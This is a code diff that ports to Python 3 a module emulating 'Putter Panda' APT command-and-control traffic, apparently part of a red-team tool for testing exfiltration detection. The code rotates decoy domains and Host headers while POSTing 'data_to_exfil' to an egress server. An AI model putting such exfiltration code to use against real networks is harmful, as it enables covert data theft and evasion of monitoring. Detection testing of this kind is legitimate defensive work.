@@ -10,8 +10,8 @@ https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/APT/putter.profile
 
 import random
 import sys
-import urllib
-import urllib2
+import urllib.request, urllib.parse, urllib.error
+import urllib.request, urllib.error, urllib.parse
 
 
 class Actor:
@@ -61,7 +61,7 @@ class Actor:
         }
 
         # Iterate over get and post request 5 times
-        for times_requested in xrange(1, 6):
+        for times_requested in range(1, 6):
             selected_domain = random.choice(self.domains)
             putter_headers['Host'] = selected_domain
             putter_uri = random.choice(self.uris)
@@ -73,18 +73,18 @@ class Actor:
                   posted_data = {'putterpanda_data': data_to_exfil}
 
             # UrlEncode and send the data out
-            posted_data = urllib.urlencode(posted_data)
-            post_req = urllib2.Request(
+            posted_data = urllib.parse.urlencode(posted_data)
+            post_req = urllib.request.Request(
                 "http://" + self.egress_server + putter_uri, posted_data, headers=putter_headers)
 
             try:
-                urllib2.urlopen(post_req)
-            except urllib2.URLError:
-                print "[*] Error: Cannot connect to putter panda data exfil server!"
-                print "[*] Error: Possible firewall, or proxy prventing this?"
+                urllib.request.urlopen(post_req)
+            except urllib.error.URLError:
+                print("[*] Error: Cannot connect to putter panda data exfil server!")
+                print("[*] Error: Possible firewall, or proxy prventing this?")
                 sys.exit(1)
 
-        print "[*] INFO: PutterPanda C2 comms complete!"
+        print("[*] INFO: PutterPanda C2 comms complete!")
 
         return
 
@@ -98,7 +98,7 @@ class Actor:
         elif num == 7:
             return random.randint(1000000, 9999999)
         else:
-            print "odd error?"
+            print("odd error?")
             sys.exit()
         return
 
